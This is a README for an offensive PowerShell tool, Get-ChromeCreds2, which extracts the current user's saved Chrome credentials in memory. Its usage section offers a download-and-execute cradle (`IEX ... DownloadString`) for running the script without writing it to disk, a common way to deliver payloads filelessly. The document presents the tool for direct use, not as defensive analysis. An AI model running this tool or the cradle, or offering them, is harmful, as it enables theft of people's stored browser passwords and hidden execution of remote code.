# Get-ChromeCreds2

This script builds upon Sekirkity's [BrowserGather](https://github.com/sekirkity/BrowserGather) 
scripts as a memory-resident method of extracting the current user's Chrome credential 
repository.  

Read more [here](https://www.kerrymilan.com/dumping-chrome-creds-without-sqlite).

## Usage
Run locally:
`import-module .\Get-ChromeCreds2.ps1`

Download and run:
`IEX (New-Object Net.WebClient).DownloadString('Path\To\Get-ChromeCreds2.ps1')`
